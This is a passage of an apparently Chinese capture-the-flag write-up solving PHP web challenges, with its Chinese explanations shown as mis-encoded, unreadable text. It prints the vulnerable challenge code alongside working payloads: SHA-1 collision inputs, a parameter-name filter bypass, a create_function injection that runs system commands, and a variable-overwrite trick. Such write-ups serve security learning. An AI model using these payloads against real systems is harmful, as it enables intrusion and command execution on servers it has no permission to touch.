class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œä¼ å‚çš„æ—¶å€™ æŠŠa bæ”¹æˆarray1 å’Œarray2 ç„¶åè¦ç”¨bpä¼ ï¼Œhackbaræœ‰é•¿åº¦é™åˆ¶<br>è¿˜è¦æ³¨æ„GETè¯·æ±‚æ”¹æˆPOSTè¯·æ±‚è¦åŠ ä¸Š<code>Content-Type: application/x-www-form-urlencoded</code><br><img src="https://pic1.imgdb.cn/item/68356fcb58cb8da5c811fe2f.png"><br>å¾—åˆ°ç¬¬ä¸‰å…³çš„url <code>Level___3.php</code></p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 3</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 3 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™å’Œä¸Šä¸€å…³ä¸åŒçš„å°±æ˜¯md5æ”¹æˆsha1 ç½‘ä¸Šä¹Ÿå¯ä»¥æœåˆ°payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span>&amp;array<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span></span><br></pre></td></tr></table></figure></div>
<p>ä¸€æ ·ç”¨bpå‘poståŒ… å¾—åˆ°ç¬¬å››å…³url <code>level_level_4.php</code></p>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is last level</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> give me a parameterlevel <span class="number">4</span> failed ...</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼ ä¸‹åˆ’çº¿ ç‚¹  è¿™é‡Œè¦äº†è§£ä¸€ä¸‹phpä¸­çš„ç‰¹æ€§ï¼šphpä¸­ç”¨getå’Œpostä¼ å…¥çš„å‚æ•°å¦‚æœæœ‰.å’Œç©ºæ ¼ä¼šè½¬æ¢æˆä¸‹åˆ’çº¿_,å¦‚æœæ˜¯+å·ä¼šè½¬æ¢æˆç©ºæ ¼ æ‰€ä»¥å…ˆç”¨+å·å˜æˆç©ºæ ¼ å†åˆ©ç”¨ç©ºæ ¼å°±å¯ä»¥è½¬æ¢å‡ºä¸‹åˆ’çº¿<br>payload <code>?NI+SA+=txw4ever</code><br>ç¬¬äº”å…³url   55_5_55.php</p>
<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œçœ‹ä¼¼è¿‡æ»¤äº†aå­—æ¯å’Œæ•°å­— ä½†æ˜¯è¿‡æ»¤æ˜¯ä»¥å­—æ¯å’Œæ•°å­—å¼€å¤´çš„ æ‰€ä»¥å¯ä»¥ç”¨\ç»•è¿‡ ç„¶ååé¢è°ƒç”¨å‡½æ•°<code>$a</code> å‚æ•°<code>$b</code><br>è¿™é‡Œå¯ä»¥é€šè¿‡\create_functionè°ƒç”¨å…¨å±€å‡½æ•°ï¼Œå¹¶ä¸”ç»•è¿‡wafï¼Œç„¶åbç”¨<code>&#125;</code>é—­åˆæ’å…¥æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæœ€å<code>/*</code>æ³¨é‡Šåé¢çš„å†…å®¹<br>payload <code>a=\create_function&amp;b=&#125;system(&#39;ä½ æƒ³æ‰§è¡Œçš„å‘½ä»¤&#39;);/*</code></p>
<h1 id="Leveling-up-up-up"><a href="#Leveling-up-up-up" class="headerlink" title="Leveling up up up!"></a>Leveling up up up!</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cookie&#x27;</span>]))&#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cookie&#x27;</span>]==<span class="string">&#x27;j0k3r&#x27;</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>]))&#123;</span><br><span class="line">                  <span class="variable">$aaa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line">                  <span class="variable">$bbb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>];</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$aaa</span>==<span class="number">114514</span> &amp;&amp; <span class="variable">$bbb</span>==<span class="number">114514</span> &amp;&amp; <span class="variable">$aaa</span>!=<span class="variable">$bbb</span>)&#123;</span><br><span class="line">                   <span class="variable">$give</span> = <span class="string">&#x27;cancanneedflag&#x27;</span>;</span><br><span class="line">                   <span class="variable">$get</span> =<span class="string">&#x27;FuckUhacker!&#x27;</span>;</span><br><span class="line">                   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">                         <span class="keyword">die</span>(<span class="variable">$give</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                   <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="variable">$get</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                         <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&quot;æ´—æ´—ç¡å§&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¡Œä¸è¡Œå•Šç»†ç‹—&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;èœèœ&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;å°±è¿™?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;ä½ å¾ˆå¼±æ¬¸&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> ä½ å¾ˆå¼±æ¬¸</span><br></pre></td></tr></table></figure></div>
<p>è¿™ç§é¢˜ç›®è¦ä¸€æ­¥ä¸€æ­¥åšï¼Œç„¶åçœ‹æœ‰æ²¡æœ‰æ­£ç¡®çš„å›æ˜¾<br>ç¬¬ä¸€æ­¥çš„æ¡ä»¶æ˜¯<code>if($_POST[&#39;gdou&#39;]!=$_POST[&#39;ctf&#39;] &amp;&amp; md5($a)===md5($b))</code> è¿™ä¸ªå’Œä¸Šé¢åšçš„é‚£ä¸ªmd5å¼ºæ¯”è¾ƒä¸€æ ·<br><img src="https://pic1.imgdb.cn/item/6835794558cb8da5c81229a8.png"><br>çœ‹åˆ°è¿”å›çš„å­—æ®µå’Œä¹‹å‰ä¸ä¸€æ ·å°±è¯´æ˜é€šè¿‡äº†è¿™ä¸ªéªŒè¯<br>ç¬¬äºŒæ­¥<code>if ($_COOKIE[&#39;cookie&#39;]==&#39;j0k3r&#39;)</code><br>ç›´æ¥åœ¨å‘é€çš„åŒ…é‡Œé¢åŠ ä¸Šcookieå°±å¯ä»¥äº†<br><img src="https://pic1.imgdb.cn/item/68357ac558cb8da5c8122a44.png"><br>ç¬¬ä¸‰æ­¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>]))&#123;</span><br><span class="line">                  <span class="variable">$aaa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line">                  <span class="variable">$bbb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>];</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$aaa</span>==<span class="number">114514</span> &amp;&amp; <span class="variable">$bbb</span>==<span class="number">114514</span> &amp;&amp; <span class="variable">$aaa</span>!=<span class="variable">$bbb</span>)</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œåˆ©ç”¨phpä¸­çš„å¼±æ¯”è¾ƒï¼Œè¿™é‡Œaaa  bbbä¸èƒ½ä¸€æ · ä½†æ˜¯è¦éƒ½ç­‰äºåŒä¸€ä¸ªæ•°å­—ï¼Œå¯ä»¥ç”¨å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²åœ¨å’Œæ•°å­—æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢æˆæ•°å­—<br><img src="https://pic1.imgdb.cn/item/68357c4f58cb8da5c8122be9.png"><br>æœ€åä¸€æ­¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="variable">$get</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                         <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œçš„flagä¸èƒ½ç›´æ¥å°±ç­‰äºflagï¼Œè¦åˆ©ç”¨ä¸€ä¸ªä¸­é—´å˜é‡ç„¶åè®©postä¸­ä¼ å…¥<code>flag=x</code>è®©è¿™ä¸ªä¸­é—´å˜é‡xå­˜flagçš„åŸæ¥çš„å€¼ï¼Œç„¶ååœ¨getä¸­ä¼ å…¥<code>x=flag</code>åˆä¼šè®©flagæ¢å¤åŸæ¥çš„å€¼ï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡å˜é‡è¦†ç›–</p>
<h1 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">you know where I am <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cinder-&gt;<span class="title function_ invoke__">echo_name</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; 